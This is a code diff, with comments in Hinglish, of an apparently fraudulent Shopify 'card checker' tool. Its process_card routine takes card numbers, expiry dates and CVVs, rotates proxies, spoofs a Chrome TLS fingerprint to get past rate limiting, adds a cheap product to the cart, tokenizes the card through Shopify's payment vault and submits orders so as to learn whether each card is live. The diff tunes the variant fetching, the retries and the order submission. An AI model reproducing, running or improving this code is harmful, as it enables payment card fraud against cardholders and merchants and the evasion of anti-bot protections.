IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
 
@@ -148,6 +146,48 @@ class Utils:
         return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"
 
 # =========== NETWORK UTILITIES ===============
+def parse_site_variant(site_str):
+    """
+    Parse combined site strings like:
+      'a1zcmc-ub.myshopify.com & variant=48034682306818'
+      'site.com  &  Variant = 48034682306818'
+    Returns (clean_site, variant_or_None)
+    """
+    if not site_str:
+        return None, None
+    site_str = site_str.strip()
+    m = re.search(r'^(.*?)\s*&\s*variant\s*=\s*(\S+)$', site_str, re.IGNORECASE)
+    if m:
+        return m.group(1).strip(), m.group(2).strip()
+    return site_str, None
+
+
+def extract_raw_site_value(request: Request):
+    """
+    FastAPI query mein `&` separator ki wajah se site value toot jaati hai.
+    Raw query string se site=... ke beech ka poora value nikaalta hai,
+    taaki 'site.com & variant=123' format handle ho sake.
+    """
+    try:
+        raw = request.url.query
+        if isinstance(raw, bytes):
+            raw = raw.decode('utf-8')
+        start = raw.find('site=')
+        if start == -1:
+            return None
+        start += 5
+        end = len(raw)
+        for key in ('&cc=', '&proxy=', '&variant='):
+            idx = raw.find(key, start)
+            if idx != -1:
+                end = min(end, idx)
+        value = raw[start:end]
+        # URL decode plus spaces
+        return value.replace('+', ' ').replace('%20', ' ').replace('%26', '&').replace('%3D', '=').replace('%3d', '=').strip()
+    except Exception:
+        return None
+
+
 def parse_proxy(proxy_str):
     """
     Parse proxy string into aiohttp-compatible format.
@@ -233,26 +273,30 @@ async def make_graphql_request_with_captcha_handling(
 ):
     response = None
     response_text = ""
-    # curl_cffi timeout = total seconds float
-    timeout = TIMEOUT_GRAPHQL
+    # Fast timeouts to drop dead proxies quickly
+    timeout = aiohttp.ClientTimeout(total=TIMEOUT_GRAPHQL, connect=10, sock_read=15)
 
     for attempt in range(max_retries + 1):
         try:
             response = await session.post(graphql_url, params=params, headers=headers, json=json_data, timeout=timeout, proxy=proxy)
-            response_text = response.text
+            response_text = await response.text()
             return response, response_text, False
 
-        except (asyncio.TimeoutError, CffiTimeout):
+        except asyncio.TimeoutError:
             if attempt == max_retries:
                 return None, "Request timed out", False
             await asyncio.sleep(0.5)
-        except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError, CffiProxyError, CffiConnectionError) as e:
+        except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
             if attempt == max_retries:
-                return None, f"Proxy Error: {str(e) or type(e).__name__}", False
+                return None, "Proxy Error: Authentication failed or proxy rejected", False
             await asyncio.sleep(0.5)
-        except CffiCurlError as e:
+        except aiohttp.ClientConnectorError as e:
             if attempt == max_retries:
-                return None, f"Network error: {str(e) or type(e).__name__}", False
+                return None, "Proxy Error: Could not connect", False
+            await asyncio.sleep(0.5)
+        except aiohttp.ClientError as e:
+            if attempt == max_retries:
+                return None, f"Network error: {str(e)}", False
             await asyncio.sleep(0.5)
         except Exception as e:
             if attempt == max_retries:
@@ -261,70 +305,103 @@ async def make_graphql_request_with_captcha_handling(
 
     return response, response_text, False
 
-# =========== PRODUCT FETCHER ===============
-async def fetch_products(domain, proxy_str=None):
+# =========== VARIANT CACHE ===============
+_variant_cache = {}
+_variant_cache_ttl = 300  # 5 minutes
+
+# =========== VARIANT FETCHER ===============
+async def fetch_variants(domain, proxy_str=None):
+    proxy = parse_proxy(proxy_str) if proxy_str else None
+
+    # ✅ Proxy validation
+    if proxy_str and not proxy:
+        logger.error(f"[fetch_variants] Invalid proxy format: {proxy_str[:50]}")
+        return False, f"Invalid proxy format: {proxy_str[:30]}"
+
+    if not domain.startswith('http'):
+        domain = "https://" + domain
+    cache_key = domain.rstrip('/')
+
+    # ✅ Cache hit — same site pe baar-baar request mat maaro
+    now = time.time()
+    cached = _variant_cache.get(cache_key)
+    if cached and (now - cached[0]) < _variant_cache_ttl:
+        return True, cached[1]
+
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Referer': f"{domain}/",
+    }
+
     try:
-        if not domain.startswith('http'):
-            domain = "https://" + domain
+        # curl_cffi se real Chrome ka TLS/JA3 fingerprint bhejo — ye Cloudflare/Shopify 429 bypass karta hai
+        async with AsyncSession(retry=0) as session:
+            r = await session.get(
+                f"{domain}/products.json?limit=50",
+                headers=headers,
+                proxy=proxy,
+                impersonate="chrome124",
+                timeout=TIMEOUT_PRODUCT_FETCH,
+            )
 
-        proxy = parse_proxy(proxy_str) if proxy_str else None
-        proxies_kw = {'proxy': proxy} if proxy else {}
+            if r.status_code == 429:
+                return False, "<b>Site Error! Status: 429</b>"
+            if r.status_code != 200:
+                return False, f"<b>Site Error! Status: {r.status_code}</b>"
 
-        async with CffiSession(impersonate='chrome124') as session:
-            resp = await session.get(f"{domain}/products.json", timeout=10, **proxies_kw)
-            if resp.status_code != 200:
-                return False, f"<b>Site Error! Status: {resp.status_code}</b>"
-            text = resp.text
+            text = r.text
             if "shopify" not in text.lower():
                 return False, "<b>Not Shopify!</b>"
 
-            result = json.loads(text).get('products') or []
-            if not result:
+            products = r.json().get('products', [])
+            if not products:
                 return False, "<b>No Products!</b>"
 
-        min_price = float('inf')
-        min_product = None
-
-        for product in result:
-            if not product.get('variants'):
-                continue
-            
-            for variant in product['variants']:
-                if not variant.get('available', True):
+            variants = []
+            for product in products:
+                if not product.get('variants'):
                     continue
-                
-                try:
-                    price = variant.get('price', '0')
-                    if isinstance(price, str):
-                        price = float(price.replace(',', ''))
-                    else:
-                        price = float(price)
 
-                    if price < min_price:
-                        min_price = price
-                        min_product = {
+                # Subscription wale products skip karo — ye cart mein nahi jaate
+                ptype = str(product.get('product_type', '')).lower()
+                tags = ' '.join(product.get('tags', [])).lower()
+                handle = product.get('handle', '').lower()
+                if any(x in (ptype + tags + handle) for x in ['subscription', 'subscribe', 'membership']):
+                    continue
+
+                for variant in product['variants']:
+                    if not variant.get('available', True):
+                        continue
+                    try:
+                        price = float(str(variant.get('price', '0')).replace(',', ''))
+                        variants.append({
                             'site': domain,
                             'price': f"{price:.2f}",
                             'variant_id': str(variant['id']),
                             'link': f"{domain}/products/{product['handle']}"
-                        }
-                except (ValueError, TypeError, AttributeError):
-                    continue
-        
-        if isinstance(min_product, dict) and min_product.get('variant_id'):
-            return min_product
-        else:
-            return False, "<b>No Valid Products</b>"
+                        })
+                        if len(variants) >= 15:
+                            break
+                    except (ValueError, TypeError, AttributeError):
+                        continue
+                if len(variants) >= 15:
+                    break
 
-    except (asyncio.TimeoutError, CffiTimeout):
-        return False, "<b>Site Error! Timeout (products fetch)</b>"
-    except (aiohttp.ClientError, CffiProxyError, CffiConnectionError) as e:
-        return False, f"<b>Proxy Error: {str(e) or type(e).__name__}</b>"
-    except CffiCurlError as e:
-        return False, f"<b>Network Error: {str(e) or type(e).__name__}</b>"
+            if not variants:
+                return False, "<b>No Valid Products</b>"
+
+            _variant_cache[cache_key] = (time.time(), variants)
+            return True, variants
+
     except Exception as e:
-        _err = str(e) or type(e).__name__
-        return False, f"error: {_err}"
+        err = str(e).lower()
+        if 'timeout' in err:
+            return False, "Proxy Error: Connection timed out"
+        elif 'auth' in err or '407' in err:
+            return False, "Proxy Error: Authentication failed"
+        else:
+            return False, f"Proxy Error: Could not connect ({str(e)})"
 
 # =========== RESPONSE PARSER ===============
 def extract_clean_response(message):
@@ -408,18 +485,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         s_zip = address_info["postalCode"]
         address2 = ""
 
+        auto_variants = None
         if not variant_id:
-            info = await fetch_products(ourl, proxy_str)
-            if isinstance(info, tuple) and info[0] is False:
-                return False, info[1], gateway, total_price, currency
-            variant_id = info['variant_id']
+            ok, variants = await fetch_variants(ourl, proxy_str)
+            if not ok:
+                return False, variants, gateway, total_price, currency
+            auto_variants = variants
+            variant_id = random.choice(variants)['variant_id']
 
         # force_close=True is the key to stability for rotating proxies.
         connector = aiohttp.TCPConnector(ssl=False, force_close=True)
-        timeout = TIMEOUT_CHECKOUT
+        timeout = aiohttp.ClientTimeout(total=TIMEOUT_CHECKOUT, connect=12, sock_read=25)
 
-        cffi_session_proxy = parse_proxy(proxy_str) if proxy_str else None
-        async with CffiSession(impersonate='chrome124', proxy=cffi_session_proxy) as session:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -431,18 +509,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
 
-            if cart_resp.status_code != 200:
-                # Cart fail — fresh variant_id fetch karke retry karo
+            if cart_resp.status != 200 and auto_variants:
+                # Cart fail — auto-fetched list mein se dusra variant try karo
                 try:
-                    fresh_info = await fetch_products(ourl, proxy_str)
-                    if isinstance(fresh_info, dict) and fresh_info.get('variant_id'):
-                        variant_id = fresh_info['variant_id']
+                    for v in auto_variants:
+                        if v['variant_id'] == variant_id:
+                            continue
+                        variant_id = v['variant_id']
                         cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+                        if cart_resp.status == 200:
+                            break
                 except Exception:
                     pass
 
-            if cart_resp.status_code != 200:
-                return False, f"Cart failed with status {cart_resp.status_code}", gateway, total_price, currency
+            if cart_resp.status != 200:
+                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
 
             checkout_headers = {
                 **headers,
@@ -454,8 +535,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
 
-            if response.status_code not in (200, 302):
-                return False, f"Checkout page failed: HTTP {response.status_code}", gateway, total_price, currency
+            if response.status not in (200, 302):
+                return False, f"Checkout page failed: HTTP {response.status}", gateway, total_price, currency
 
             checkout_url = str(response.url)
 
@@ -464,7 +545,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
 
-            text = response.text
+            text = await response.text()
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                 if not sst:
@@ -508,11 +589,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not subtotal:
                 price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                 subtotal = price_match.group(1) if price_match else "0.01"
-            # Shopify expects 2-decimal money strings — '12.0' se normalized '12.00'
-            try:
-                subtotal = f"{float(str(subtotal).replace(',', '')):.2f}"
-            except (ValueError, TypeError):
-                subtotal = "0.01"
 
             # Extract build ID (commitSha), source token, and identification signature
             unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
@@ -600,7 +676,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {'any': True},
+                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                             'lineComponentsSource': None,
                             'lineComponents': []
                         }]
@@ -610,10 +686,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'paymentLines': [],
                         'billingAddress': {
                             'streetAddress': {
-                                'address1': street, 'address2': address2, 'city': city,
-                                'countryCode': country_code, 'postalCode': s_zip,
-                                'firstName': firstName, 'lastName': lastName,
-                                'zoneCode': state, 'phone': phone
+                                'address1': '', 'city': '', 'countryCode': country_code,
+                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                             }
                         }
                     },
@@ -651,14 +725,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
 
+            # K1-FIX (dito-OLD app.py): round-1 warm-up, round-2 ka FRESH result use
+            _round1_text = None
             for i in range(2):
                 response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=0, proxy=proxy
                 )
                 if is_captcha_required(resp_text):
                     break
                 if i == 0:
-                    await asyncio.sleep(1.0) # Let Shopify calculate taxes and shipping properly
+                    _round1_text = resp_text
+                    await asyncio.sleep(0.3) # Let Shopify calculate taxes and shipping properly (old-timing)
 
             if not response:
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
@@ -716,10 +793,29 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, "No runningTotal in sellerProposal", gateway, total_price, currency
 
                 running_total = running_total_data['value']['amount']
-                try:
-                    running_total = f"{float(str(running_total).replace(',', '')):.2f}"
-                except (ValueError, TypeError):
-                    pass
+
+                # K1-FIX: round-2 ka response fresh totals deta hai — usko parse karke
+                # runningTotal/delivery/tax overwrite karo (OLD app.py ka exact behavior)
+                if _round1_text is not None:
+                    try:
+                        _r2_json = json.loads(resp_text)
+                        if not isinstance(_r2_json, dict):
+                            raise ValueError('r2-not-dict')
+                        _data = _r2_json.get('data') or {}
+                        _sess = _data.get('session') or {}
+                        _neg = _sess.get('negotiate') or {}
+                        _res = _neg.get('result') or {}
+                        _r2_seller = _res.get('sellerProposal') or {}
+                        if _r2_seller:
+                            _r2_delivery = _r2_seller.get('delivery')
+                            _r2_running = _r2_seller.get('runningTotal')
+                            if _r2_running and _r2_running.get('value', {}).get('amount'):
+                                running_total = _r2_running['value']['amount']
+                            if _r2_delivery:
+                                delivery_data = _r2_delivery
+                            seller_proposal = _r2_seller
+                    except (json.JSONDecodeError, KeyError, TypeError):
+                        pass  # round-2 parse fail → round-1 values hi use honge
 
             except (KeyError, TypeError) as e:
                 return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
@@ -736,7 +832,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                 # Ek aur proposal bhejo — ab FilledDeliveryTerms milni chahiye
                 response, resp_text, _ = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=0, proxy=proxy
                 )
                 if response:
                     try:
@@ -749,10 +845,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             running_total_data = retry_seller.get('runningTotal', running_total_data)
                             if running_total_data:
                                 running_total = running_total_data['value']['amount']
-                                try:
-                                    running_total = f"{float(str(running_total).replace(',', '')):.2f}"
-                                except (ValueError, TypeError):
-                                    pass
                             seller_proposal = retry_seller
                     except (KeyError, TypeError, json.JSONDecodeError) as e:
                         # FIX 4: Specific exception handling
@@ -776,17 +868,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         except:
                             shipping_amount = 0.0
                     else:
-                        # available strategies empty — seller's OWN selected strategy use karo
-                        # (DELIVERY_LINE_DETAIL_CHANGED crack — stale mera propose, seller ka sahi)
-                        _sel = delivery_lines[0].get('selectedDeliveryStrategy') or {}
-                        _sel_handle = (_sel.get('deliveryStrategyByHandle') or {}).get('handle') or _sel.get('handle') or ''
-                        if _sel_handle:
-                            delivery_strategy = _sel_handle
-                        _sel_amt = ((_sel.get('amount') or {}).get('value') or {}).get('amount')
-                        try:
-                            shipping_amount = float(_sel_amt) if _sel_amt is not None else 0.0
-                        except (ValueError, TypeError):
-                            shipping_amount = 0.0
+                        delivery_strategy = ''
+                        shipping_amount = 0.0
                 else:
                     delivery_strategy = ''
                     shipping_amount = 0.0
@@ -795,9 +878,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 shipping_amount = 0.0
 
             try:
-                tax_data = seller_proposal.get('tax') or {}
+                tax_data = seller_proposal.get('tax', {})
                 if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
-                    tax_amount_data = (tax_data.get('totalTaxAmount') or {}).get('value', {}).get('amount', '0')
+                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                     tax_amount = float(tax_amount_data)
                 else:
                     tax_amount = 0.0
@@ -805,17 +888,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 # FIX 4: Specific exception handling
                 tax_amount = 0.0
 
-            payment_data = seller_proposal.get('payment') or {}
+            payment_data = seller_proposal.get('payment', {})
             if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
-                payment_methods = payment_data.get('availablePaymentLines') or []
+                payment_methods = payment_data.get('availablePaymentLines', [])
                 for method in payment_methods:
-                    payment_method = method.get('paymentMethod') or {}
+                    payment_method = method.get('paymentMethod', {})
                     if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                         payment_identifier = payment_method.get('paymentMethodIdentifier')
                         displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
 
                         gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
-                        total_price = f"{float(running_total) + tax_amount:.2f}"
+                        total_price = str(float(running_total) + shipping_amount + tax_amount)
 
                         break
 
@@ -849,109 +932,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
             response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-, proxy=proxy
+                session, graphql_url, params, headers, json_data, checkout_url, max_retries=0, proxy=proxy
             )
 
             if is_captcha_required(resp_text):
                 return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
-
-            # CONVERGE loop: negotiate errors (tax accept / payment amount) khatam hone tak
-            # delivery proposal resubmit karo — max 3 rounds (tez — 4th round rarely converges)
-            for _conv in range(3):
-                try:
-                    _d2 = json.loads(resp_text)
-                    _data2 = _d2.get('data') or {}
-                    if 'submitForCompletion' in (_data2 or {}):
-                        break  # submit already happened — leave
-                    _neg2 = ((_data2.get('session') or {}).get('negotiate')) or {}
-                    _res2 = _neg2.get('result') or {}
-                    _errcodes = [e.get('code') for e in (_neg2.get('errors') or [])]
-                    _sp2 = _res2.get('sellerProposal') or {}
-                    _tax2 = (((_sp2.get('tax') or {}).get('totalTaxAmount') or {}).get('value') or {}).get('amount')
-                    _rt2 = ((_sp2.get('runningTotal') or {}).get('value') or {}).get('amount')
-                    _ml2 = ((_sp2.get('merchandise') or {}).get('merchandiseLines') or [{}])[0]
-                    _merch2 = (((_ml2.get('totalAmount') or {}).get('value') or {}).get('amount'))
-                    # seller's OWN line stableId (UUID) — mera page-level '1'/fallback DETAIL_CHANGED deta hai
-                    _stab2 = _ml2.get('stableId')
-                    # shipping from seller proposal (selected strategy amount)
-                    _dl2 = (((_sp2.get('delivery') or {}).get('deliveryLines') or [{}])[0])
-                    _ship2 = (((_dl2.get('amount') or {}).get('value') or {}).get('amount'))
-                    if _ship2 is None:
-                        _sd = ((_dl2.get('selectedDeliveryStrategy') or {}).get('amount') or {}).get('value') or {}
-                        _ship2 = _sd.get('amount') if isinstance(_sd, dict) else None
-                except Exception:
-                    _errcodes, _tax2, _rt2, _merch2, _ship2 = [], None, None, None, None
-                    _stab2 = None
-
-                if not _errcodes:
-                    break  # converged — clean
-                # hard-fail codes pe resubmit bekaar — leave
-                if any(c in _errcodes for c in ['CheckpointDenied']):
-                    break
-
-                # WAITING_PENDING_TERMS — seller terms abhi compute ho rahe: WAIT karo settle
-                # hone tak (shopify frfr: pending terms pe turant resubmit = rejection repeat)
-                if 'WAITING_PENDING_TERMS' in _errcodes:
-                    await asyncio.sleep(1.2)
-
-                # update locals from latest seller proposal — shopify ka ACTUAL merch total
-                if _rt2:
-                    running_total = f"{float(str(_rt2).replace(',', '')):.2f}"
-                # NEVER trust seller's merchTotal blindly — kabhi 200.00-class garbage aata hai
-                # (dusra variant/recurring line). Sanity: item price ke 3x se zyada ho to ignore
-                if _merch2:
-                    try:
-                        _merch_f = float(str(_merch2).replace(',', ''))
-                        _anchor = float(str(subtotal).replace(',', '')) if subtotal else 0.0
-                        if _anchor > 0 and _merch_f <= _anchor * 3:
-                            json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {
-                                'value': {'amount': f"{_merch_f:.2f}", 'currencyCode': currency}
-                            }
-                    except (ValueError, TypeError, KeyError, IndexError):
-                        pass
-                _new_tax = float(str(_tax2)) if _tax2 else 0.0
-                tax_amount = _new_tax  # local var sync — payment.amount converge ke baad sahi
-                # shipping local sync — _ship2 None ho to LAST-KNOWN shipping (0 pe overwrite na karo)
-                if _ship2 is not None:
-                    try:
-                        shipping_amount = float(str(_ship2))
-                    except (ValueError, TypeError):
-                        pass
-                # seller's stableId sync — merchandise + delivery target lines ko seller ke
-                # apne UUID se bharo (page-level stableId DETAIL_CHANGED deta hai)
-                if _stab2:
-                    json_data['variables']['merchandise']['merchandiseLines'][0]['stableId'] = _stab2
-                    try:
-                        json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
-                            'lines': [{'stableId': _stab2}]
-                        }
-                    except (KeyError, IndexError, TypeError):
-                        pass
-                # checkpoint refresh — LAST converge response ka checkpointData use karo
-                _cp2 = _res2.get('checkpointData')
-                if _cp2:
-                    checkpoint_data = _cp2
-                # DELIVERY EXPECTED FIX: jab seller deliveryLines.amount None de (no shipping
-                # categories), delivery.expected = rt − merch (exact difference) — 0.0 kabhi nahi
-                try:
-                    _rt_f = float(str(_rt2).replace(',', '')) if _rt2 else float(str(running_total).replace(',', ''))
-                    _merch_f = float(str(_merch2).replace(',', '')) if _merch2 else 0.0
-                    _dlv_expected = max(_rt_f - _merch_f, 0.0)
-                    json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
-                        'value': {'amount': f"{_dlv_expected:.2f}", 'currencyCode': currency}
-                    }
-                except (ValueError, TypeError):
-                    pass
-                json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(_new_tax)
-                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
-                await asyncio.sleep(0.6)  # totals settle between converge rounds (fast churn crack)
-                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
-                )
-                if is_captcha_required(resp_text):
-                    return False, "CAPTCHA_REQUIRED on converge proposal", gateway, total_price, currency
-            # END CONVERGE loop
 
             # Ensure Year is always 4 digits for PCI Vault
             ano_int = int(ano)
@@ -990,19 +975,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
 
-            vault_timeout = TIMEOUT_VAULT
+            vault_timeout = aiohttp.ClientTimeout(total=TIMEOUT_VAULT, connect=8)
             token = None
             for v_attempt in range(3):
                 try:
                     response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=vault_timeout)
-                    if response.status_code == 200:
-                        token_data = response.json()
+                    if response.status == 200:
+                        token_data = await response.json()
                         token = token_data.get('id')
                         if token:
                             break
                 except Exception:
                     pass
-                await asyncio.sleep(0.05)
+                await asyncio.sleep(0.1)
 
             if not token:
                 return False, 'Unable to get payment token (Vault Error)', gateway, total_price, currency
@@ -1085,7 +1070,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'amount': {
-                                'value': {'amount': f"{float(running_total) + tax_amount:.2f}", 'currencyCode': currency}
+                                'value': {'amount': running_total, 'currencyCode': currency}
                             },
                             'dueAt': None
                         }],
@@ -1138,52 +1123,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
 
             response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
+                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=0, proxy=proxy
             )
 
             if is_captcha_required(text):
                 return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
 
-            # TOTAL-CHANGED crack: submit pe 'Your order total has changed' aata hai jab totals
-            # churn hue — ek aur delivery proposal (fresh tax/runningTotal) + resubmit once
             if "Your order total has changed." in text:
-                # fresh delivery proposal — session ka latest state utha lega
-                json_data['query'] = QUERY_PROPOSAL_DELIVERY
-                response2, resp_text2, _cap = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, {'operationName': 'Proposal'}, headers, json_data, checkout_url, max_retries=1, proxy=proxy
-                )
-                try:
-                    _d3 = json.loads(resp_text2)
-                    _neg3 = ((_d3.get('data') or {}).get('session') or {}).get('negotiate') or {}
-                    _res3 = _neg3.get('result') or {}
-                    _sp3 = _res3.get('sellerProposal') or {}
-                    _rt3 = ((_sp3.get('runningTotal') or {}).get('value') or {}).get('amount')
-                    _tax3 = (((_sp3.get('tax') or {}).get('totalTaxAmount') or {}).get('value') or {}).get('amount')
-                    _cp3 = _res3.get('checkpointData')
-                except Exception:
-                    _rt3, _tax3, _cp3 = None, None, None
-                if _rt3:
-                    running_total = f"{float(str(_rt3).replace(',', '')):.2f}"
-                _t3 = float(str(_tax3)) if _tax3 else 0.0
-                total_price = str(float(running_total) + _t3)
-                if _tax3:
-                    json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(_t3)
-                if _cp3:
-                    submit_variables['input']['checkpointData'] = _cp3
-                submit_variables['input']['sessionInput']['sessionToken'] = sst
-                submit_json_data = {
-                    'query': MUTATION_SUBMIT,
-                    'variables': submit_variables,
-                    'operationName': 'SubmitForCompletion'
-                }
-                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, {'operationName': 'SubmitForCompletion'}, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
-                )
-                if is_captcha_required(text):
-                    return False, "CAPTCHA_REQUIRED on resubmit", gateway, total_price, currency
-
-            if "Your order total has changed." in text:
-                return False, "Total changed (retried)", gateway, total_price, currency
+                return False, "Site not supported", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
 
@@ -1203,7 +1150,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 result_type = submit_data.get('__typename', '')
 
                 if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
-                    receipt = submit_data.get('receipt') or {}
+                    receipt = submit_data.get('receipt', {})
                     if receipt:
                         receipt_type = receipt.get('__typename', '')
 
@@ -1222,7 +1169,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     errors = submit_data.get('errors', [])
                     if errors:
                         for error in errors:
-                            code = error.get('code')
+                            code = error.get('code', '')
+                            localized_msg = error.get('localizedMessage', '')
+                            non_localized_msg = error.get('nonLocalizedMessage', '')
+                            # K3-FIX: generic code pe REAL decline-reason passthrough (old-app.py)
+                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
+                                detail = localized_msg or non_localized_msg
+                                if detail:
+                                    return False, detail, gateway, total_price, currency
                             if code:
                                 return False, code, gateway, total_price, currency
                     return False, "Submit Rejected", gateway, total_price, currency
@@ -1230,7 +1184,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 elif result_type == 'Throttled':
                     return False, "Throttled", gateway, total_price, currency
 
-                receipt = submit_data.get('receipt') or {}
+                receipt = submit_data.get('receipt', {})
                 if not receipt:
                     return False, "No receipt in submit response", gateway, total_price, currency
 
@@ -1250,13 +1204,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'PollForReceipt'
             }
 
-            await asyncio.sleep(0.1)  # Initial polling wait
-
-            poll_wait = 1.0  # default wait between polls
-            for i in range(8):  # 4 → 8: slow banks ke liye zyada chances
+            poll_wait = 1.0  # K2-FIX: old-app.py patience (slow banks ke ProcessingReceipts catch)
+            for i in range(5):  # fast response ke liye 4 polls enough
                 response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, poll_json_data,
-                    checkout_url, max_retries=1, proxy=proxy
+                    checkout_url, max_retries=0, proxy=proxy
                 )
 
                 if not response:
@@ -1268,7 +1220,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                 try:
                     poll_json = json.loads(final_text)
-                    receipt_data = (poll_json.get('data') or {}).get('receipt') or {}
+                    receipt_data = poll_json.get('data', {}).get('receipt', {})
 
                     if receipt_data:
                         typename = receipt_data.get('__typename', '')
@@ -1276,10 +1228,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         if typename == 'ProcessedReceipt':
                             return True, "ORDER_PLACED", gateway, total_price, currency
                         elif typename == 'FailedReceipt':
